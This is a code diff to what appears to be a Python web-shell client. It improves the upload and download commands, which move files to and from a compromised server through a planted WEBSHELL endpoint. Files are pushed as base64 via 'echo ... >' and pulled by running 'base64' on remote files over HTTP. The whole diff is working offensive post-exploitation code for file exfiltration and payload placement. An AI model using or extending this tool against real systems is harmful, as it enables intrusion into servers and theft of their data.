@@ -131,18 +131,22 @@ try:
                      remotefile = command.split()[1]
                   if not slash in remotefile:
                      if remotefile == localfile:
-                        remotefile = path.rstrip() + slash + command.split()[1]
+                        remotesplit = remotefile.split(localslash)[-1]
+                        remotefile = path.rstrip() + slash + remotesplit
                      else:
-                         remotefile = path.rstrip() + slash + command.split()[2]
+                         remotefile = command.split()[2]
                   remotefiletmp = remotefile.rstrip() + ".tmp"
-                  if not slash in localfile:
+                  if not localslash in localfile:
                      cwd = os.getcwd()
+                     print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "red"))
+                  else:
+                     print (colored("[+] Uploading file " + localfile + " on " + remotefile + "..\n", "red"))
                   try:
                      f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                   except OSError:
                      print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                      continue
-                  print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "red"))
+
                   upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                   ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "linux":
@@ -162,12 +166,12 @@ try:
                      localfile = command.split()[2]
                      if not slash in remotefile:
                         remotefile = path.rstrip() + slash + command.split()[1]
-                     if not slash in localfile:
+                     if not localslash in localfile:
                         cwd = os.getcwd()
                         if localfile == ".":
                            localfile = command.split()[1]
                         print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "red"))
-                     if slash in localfile:
+                     else:
                         print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "red"))
                      if system == "linux":
                         base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
@@ -178,7 +182,11 @@ try:
                         base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
                         base64data = remove_html(base64data)
                      download = base64.b64decode(base64data.encode("utf8"))
-                     f = open(localfile, "wb") ; f.write(download) ; f.close()
+                     try:
+                        f = open(localfile, "wb") ; f.write(download) ; f.close()
+                     except OSError:
+                        print (colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
+                        continue
                else:
                   if "pwd" in command.split()[0]:
                      path = str(path) + "\n"
